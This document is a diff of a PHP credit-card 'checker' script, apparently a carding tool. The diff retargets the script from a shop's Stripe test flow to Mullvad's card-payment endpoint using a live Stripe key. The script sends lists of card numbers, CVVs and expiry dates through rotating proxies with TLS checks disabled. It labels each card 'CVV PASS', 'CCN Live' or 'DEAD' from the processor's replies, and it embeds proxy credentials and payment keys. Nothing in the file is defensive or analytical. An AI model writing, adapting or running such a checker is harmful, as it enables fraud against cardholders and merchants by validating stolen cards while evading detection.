@@ -199,7 +199,7 @@ $rp1 = array(
   4 => 'klwdhqgx-rotate:gptpwm4f7fp7',
     ); 
     $rpt = array_rand($rp1);
-    $rotate = $rp1[$rpt];
+    $rotate = $rp1[$rpt];;
 
 
 $ip = array(
@@ -260,10 +260,10 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[email]='.$email.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F7e5462ae1%3B+stripe-js-v3%2F7e5462ae1&time_on_page=215625&key=pk_test_51KFJHsIOrA4X2WUK0uFeTKxvGZDZNA037nLGq0Owz8kdd3KSU2a352SKAhuozcwTPPrlwDjdKmmIE4vKp9tpXjzK009YjJEm71');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F0ba445fb4%3B+stripe-js-v3%2F0ba445fb4&time_on_page=70172&key=pk_live_b1GfXgTHZdUWAxjCVLovCNiS00DbtkXpS8');
 
-$result1 = curl_exec($ch);
-$id = trim(strip_tags(getStr($result1,'"id": "','"'))); 
+ $result1 = curl_exec($ch);
+ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 //=======================[1 REQ-END]==============================//
 
 
@@ -271,7 +271,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_3KeD8VIOrA4X2WUK0JKSyE6m/confirm');
+curl_setopt($ch, CURLOPT_URL, 'https://api.mullvad.net/www/payments/stripe/card/create-card-payment/');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -282,16 +282,16 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: api.stripe.com',
+'authority: api.mullvad.net',
 'method: POST',
-'path: /v1/payment_intents/pi_3KeD8VIOrA4X2WUK0JKSyE6m/confirm',
+'path: /www/payments/stripe/card/create-card-payment/',
 'scheme: https',
-'accept: application/json',
+'accept: application/json, text/plain, */*',
 'accept-language: en-US,en;q=0.5',
-'content-type: application/x-www-form-urlencoded',
+'content-type: application/json',
 'cookie: ',
-'origin: https://js.stripe.com',
-'referer: https://js.stripe.com/',
+'origin: https://mullvad.net',
+'referer: https://mullvad.net/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
@@ -301,19 +301,61 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'return_url=https%3A%2F%2Fowena-shop.com%2Fsttransaction%2F3dsecure_result%23&setup_future_usage=off_session&payment_method='.$id.'&expected_payment_method_type=card&key=pk_test_51KFJHsIOrA4X2WUK0uFeTKxvGZDZNA037nLGq0Owz8kdd3KSU2a352SKAhuozcwTPPrlwDjdKmmIE4vKp9tpXjzK009YjJEm71&client_secret=pi_3KeD8VIOrA4X2WUK0JKSyE6m_secret_X9cgbwteFwfupdGqkaPZJfO1O');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'{"token":"'.$token.'","months":1}');
 
+  $result2 = curl_exec($ch);
+ $message = trim(strip_tags(getstr($result2,'"message":"','"')));
+$token = trim(strip_tags(getstr($result2,'"id":"','"')));
 
-$result2 = curl_exec($ch);
+//=======================[2 REQ-END]==============================//
+
+//=======================[3 REQ]==================================//
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+curl_setopt($ch, CURLOPT_URL, 'https://api.mullvad.net/www/payments/stripe/card/create-card-payment/');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'authority: api.mullvad.net',
+'method: POST',
+'path:  /www/payments/stripe/card/create-card-payment/',
+'scheme: https',
+'accept: application/json, text/plain, */*',
+'accept-language: en-US,en;q=0.5',
+'content-type: application/json',
+'cookie: ',
+'origin: https://mullvad.net',
+'referer: https://mullvad.net/',
+'sec-fetch-dest: empty',
+'sec-fetch-mode: cors',
+'sec-fetch-site: same-origin',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
+'x-requested-with: XMLHttpRequest',
+   ));
+
+# ----------------- [3req Postfields] ---------------------#
+
+curl_setopt($ch, CURLOPT_POSTFIELDS,'{"token":"'.$token.'","months":1,"intent":"pi_3KebXIFFAsUsDBV51F6WMybQ"}');
+$result3 = curl_exec($ch);
+$message = trim(strip_tags(getstr($result3,'"message":"','"')));
 $info = curl_getinfo($ch);
 $time = $info['total_time'];
 
-//=======================[2 REQ-END]==============================//
+//=======================[3 REQ-END]==============================//
+
 
 
 //=======================[MADE BY]==============================//
 
-$MADEBY = "[ (BD)@Anonbd ]";
+$MADEBY = "[ (anonbd) ]";
 
 //[You Have  To Change Name Here Automatically In All Response Will Change ]//
 
@@ -324,11 +366,11 @@ $MADEBY = "[ (BD)@Anonbd ]";
 
 # - [CVV Responses ] - #
 
-if ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "incorrect_zip")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
+if ((strpos($result3, '"cvc_check":"pass"')) || (strpos($result3, "Thank You.")) || (strpos($result3, 'Your card zip code is incorrect.')) || (strpos($result3, "Thank You For Donation.")) || (strpos($result3, "incorrect_zip")) || (strpos($result3, "Success ")) || (strpos($result3, '"type":"one-time"')) || (strpos($result3, "/donations/thank_you?donation_number="))){
     echo '<br><span class="badge badge-success">#CVV ✓ </span> : ' . $lista . ' ➜  CVV PASS ➜ </span> ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
-elseif ((strpos($result2, "Your card has insufficient funds.")) || (strpos($result2, '"cvc_check": "fail"'))){
+elseif ((strpos($result3, "Your card has insufficient funds.")) || (strpos($result3, '"cvc_check": "fail"'))){
     echo '<br><span class="badge badge-success">#CVV ✓ </span> : ' . $lista . ' ➜ R ➜ Your card has insufficient funds.  ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
@@ -337,7 +379,7 @@ elseif ((strpos($result2, "Your card has insufficient funds.")) || (strpos($resu
 
 # - [CCN Responses ] - #
 
-elseif ((strpos($result2, 'security code is incorrect.')) || (strpos($result2, "security code is invalid.")) || (strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc"))){
+elseif ((strpos($result3, 'security code is incorrect.')) || (strpos($result3, "security code is invalid.")) || (strpos($result3, "Your card's security code is incorrect.")) || (strpos($result3, "incorrect_cvc"))){
     echo '<br><span class="badge badge-warning">#CCN ✓ </span> : ' . $lista . ' ➜  CCN Live ➜ </span> ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 
 }
@@ -347,7 +389,7 @@ elseif ((strpos($result2, 'security code is incorrect.')) || (strpos($result2, "
 
 #- [Stolen,Lost,Pickup Responses]- #
 
-elseif ((strpos($result2, 'stolen_card')) || (strpos($result2, "lost_card")) || (strpos($result2, "pickup_card."))){
+elseif ((strpos($result3, 'stolen_card')) || (strpos($result3, "lost_card")) || (strpos($result3, "pickup_card."))){
     echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
@@ -358,19 +400,19 @@ elseif ((strpos($result2, 'stolen_card')) || (strpos($result2, "lost_card")) || 
 
 # -[Reprovada,Decline Responses ] - #
 
-elseif ((strpos($result2, 'card was declined')) || (strpos($result2, "generic_decline")) || (strpos($result2, 'do_not_honor')) || (strpos($result1, "generic_decline")) || (strpos($result2, "processing_error")) || (strpos($result2, "parameter_invalid_empty")) || (strpos($result2, 'lock_timeout')) || (strpos($result2, "transaction_not_allowed"))){
+elseif ((strpos($result3, 'card was declined')) || (strpos($result1, "generic_decline")) || (strpos($result3, 'do_not_honor')) || (strpos($result1, "generic_decline")) || (strpos($result3, "processing_error")) || (strpos($result3, "parameter_invalid_empty")) || (strpos($result3, 'lock_timeout')) || (strpos($result3, "transaction_not_allowed"))){
     echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
-elseif ((strpos($result2, 'Payment cannot be processed, missing credit card number')) || (strpos($result2, "missing_payment_information")) || (strpos($result2, 'three_d_secure_redirect')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, "service_not_allowed")) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, 'Your card does not support this type of purchase.')) || (strpos($result2, "transaction_not_allowed"))){
+elseif ((strpos($result3, 'Payment cannot be processed, missing credit card number')) || (strpos($result3, "missing_payment_information")) || (strpos($result3, 'three_d_secure_redirect')) || (strpos($result3, '"cvc_check": "unchecked"')) || (strpos($result3, "service_not_allowed")) || (strpos($result3, '"cvc_check": "unchecked"')) || (strpos($result3, 'Your card does not support this type of purchase.')) || (strpos($result3, "transaction_not_allowed"))){
     echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
-elseif (strpos($result2,  'Your card has expired.')) {
+elseif (strpos($result3,  'Your card has expired.')) {
   echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Your card has expired. ➜:  DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
-elseif (strpos($result2,  'Your card number is incorrect.')) {
+elseif (strpos($result3,  'Your card number is incorrect.')) {
   echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Your card number is incorrect. ➜  DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
@@ -380,7 +422,7 @@ elseif (strpos($result2,  'Your card number is incorrect.')) {
 
 # - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses ] - #
 elseif 
-(strpos($result2,  '-1')) {
+(strpos($result3,  '-1')) {
     echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Update Nonce ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
@@ -389,13 +431,16 @@ else {
 }
 
 # - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] - #
+
 //=======================[Responses-END]==============================//
+
 
 curl_close($ch);
 ob_flush();
 
 echo "<b>1REQ Result:</b> $result1<br><br>";
 echo "<b>2REQ Result:</b> $result2<br><br>";
+echo "<b>3REQ Result:</b> $result3<br><br>";
 
 //=============================================================//
 //================[Made By :- [🇮🇳]DRAGON MASTER]===============//
